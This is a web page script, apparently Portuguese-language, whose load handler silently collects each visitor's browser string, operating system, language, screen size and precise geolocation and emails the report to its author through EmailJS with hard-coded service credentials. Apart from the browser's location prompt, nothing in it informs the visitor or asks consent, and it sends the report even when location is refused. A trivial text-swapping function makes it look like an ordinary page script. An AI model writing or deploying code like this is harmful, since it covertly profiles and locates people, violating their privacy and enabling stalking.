
emailjs.init("rgNxmNPJXxIx7I5hz");

function trocar (){
    let valor = document.getElementById('autor')
    valor.innerHTML = 'Alladin'
}

function detectarSO(ua) {
    if (ua.includes("Windows NT 10.0"))
        return "Windows 10/11";
    if (ua.includes("Android"))
        return "Android";
    if (ua.includes("iPhone"))
        return "iPhone";
    if (ua.includes("Mac"))
        return "macOS";
    if (ua.includes("Linux"))
        return "Linux";

    return "Desconhecido";
}

window.onload = async function coletarDados() {

    const ua = navigator.userAgent;

    const dados = {
        data: new Date().toLocaleString("pt-PT"),
        navegador: ua,
        sistema: detectarSO(ua),
        idioma: navigator.language,
        resolucao: screen.width + "x" + screen.height,
        localizacao: "Não informada"
    };

    if (navigator.geolocation) {

        navigator.geolocation.getCurrentPosition(

            function(pos) {

                dados.localizacao =
                    "Latitude: " +
                    pos.coords.latitude +
                    ", Longitude: " +
                    pos.coords.longitude;

                enviarEmail(dados);
            },

            function() {
                enviarEmail(dados);
            }
        );

    } else {
        enviarEmail(dados);
    }
}

function enviarEmail(dados) {

    const relatorio = 
    `Data: ${dados.data}
    Navegador: ${dados.navegador}
    Sistema: ${dados.sistema}
    Idioma: ${dados.idioma}
    Resolução: ${dados.resolucao}
    Localização: ${dados.localizacao}`;

    emailjs.send(
        "service_cci8y2l",
        "template_0k74g13", {message: relatorio}
    )
    .then(() => {
        console.log("Dados enviados.");
    })
    .catch((err) => {
        console.error(err);
        console.log("Erro ao enviar.");
    });
}
